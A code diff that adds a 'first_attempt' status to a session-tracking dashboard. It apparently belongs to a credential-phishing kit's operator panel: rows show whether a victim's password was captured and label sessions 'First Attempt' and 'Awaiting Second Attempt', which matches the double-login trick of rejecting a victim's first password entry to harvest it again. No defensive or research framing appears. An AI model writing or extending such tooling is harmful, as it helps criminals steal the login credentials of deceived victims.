@@ -1105,6 +1105,9 @@
                     if (session.status === 'invalid') {
                         row.style.backgroundColor = '#450a0a';
                         row.style.borderLeft = '4px solid #ef4444';
+                    } else if (session.status === 'first_attempt') {
+                        row.style.backgroundColor = '#422006';
+                        row.style.borderLeft = '4px solid #fb923c';
                     } else {
                         row.style.backgroundColor = '#134e4a';
                         row.style.borderLeft = '4px solid #22c55e';
@@ -1140,6 +1143,8 @@
                         `;
                     } else if (session.status === 'valid') {
                         passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">⚠️ Password Not Captured</span>`;
+                    } else if (session.status === 'first_attempt') {
+                        passwordColumn = `<span class="status-badge" style="background: #422006; color: #fb923c;">🔄 First Attempt</span>`;
                     } else if (session.status === 'invalid') {
                         const reason = session.reason || 'FAILED ENTRY';
                         passwordColumn = `<span class="status-badge status-error">❌ ${reason}</span>`;
@@ -1178,6 +1183,10 @@
                         if (session.authMethod) {
                             sessionInfoHtml += `<div class="session-info">Auth Method: ${session.authMethod}</div>`;
                         }
+                    } else if (session.status === 'first_attempt') {
+                        sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Attempt: First Password Entry (${session.attemptNumber || 1})</div>`;
+                        sessionInfoHtml += `<div class="session-info">Method: ${session.method || 'Unknown'}</div>`;
+                        sessionInfoHtml += `<div class="session-info" style="color: #fb923c;">Status: Awaiting Second Attempt</div>`;
                     } else if (session.status === 'invalid') {
                         sessionInfoHtml += `<div class="session-info" style="color: #ef4444;">Failure Reason: ${session.reason || 'Unknown Error'}</div>`;
 
@@ -1187,6 +1196,10 @@
 
                         if (session.failureType) {
                             sessionInfoHtml += `<div class="session-info">Type: ${session.failureType}</div>`;
+                        }
+
+                        if (session.attemptNumber) {
+                            sessionInfoHtml += `<div class="session-info">Attempt Number: ${session.attemptNumber}</div>`;
                         }
 
                         sessionInfoHtml += `<div class="session-info" style="color: #ef4444;">Status: Failed Authentication</div>`;
